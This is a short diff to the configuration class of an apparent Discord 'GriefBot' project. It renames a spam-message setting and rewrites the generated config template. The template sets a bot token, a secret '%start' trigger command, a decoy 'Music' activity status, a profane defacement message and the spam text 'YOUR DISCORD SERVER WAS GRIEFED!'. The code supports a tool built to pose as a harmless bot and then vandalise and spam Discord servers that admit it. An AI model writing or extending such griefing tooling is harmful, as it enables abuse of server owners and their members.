@@ -46,14 +46,14 @@ public class Config {
 		GriefBot.getInstance().setGrieferUserID(getJsonKey(configFileString.toString(), "grieferUserID"));
 		GriefBot.getInstance().setActivityDescription(getJsonKey(configFileString.toString(), "activityDescription"));
 		GriefBot.getInstance().setGriefMessage(getJsonKey(configFileString.toString(), "griefMessage"));
-		GriefBot.getInstance().setMembersSpamMessage(getJsonKey(configFileString.toString(), "membersSpamMessage"));
+		GriefBot.getInstance().setSpamMessage(getJsonKey(configFileString.toString(), "spamMessage"));
 		
 	}
 
 	private static void createTemplateConfig() throws IOException {
 		BufferedWriter writer = new BufferedWriter(new FileWriter(CONFIG_FILE));
 		writer.write(
-				"{\n \"botToken\": \"YOUR-DISCORD-BOT-TOKEN-HERE\",\n \"griefCommand\": \"%start\",\n \"grieferUserID\": \"YOUR-USERID-HERE\",\n \"activityDescription\": \"Music\",\n \"griefMessage\": \"FUCKED-BY-%s\"\n \"spamMessage\": \"YOUR DISCORD SERVER WAS GRIEFED!\"\n \"membersSpamMessage\": \"https://discord.io/CorruptedBytes\"\n}");
+				"{\n \"botToken\": \"YOUR-DISCORD-BOT-TOKEN-HERE\",\n \"griefCommand\": \"%start\",\n \"grieferUserID\": \"YOUR-USERID-HERE\",\n \"activityDescription\": \"Music\",\n \"griefMessage\": \"FUCKED-BY-%s\",\n \"spamMessage\": \"YOUR DISCORD SERVER WAS GRIEFED!\"\n}");
 		writer.close();
 	}
 
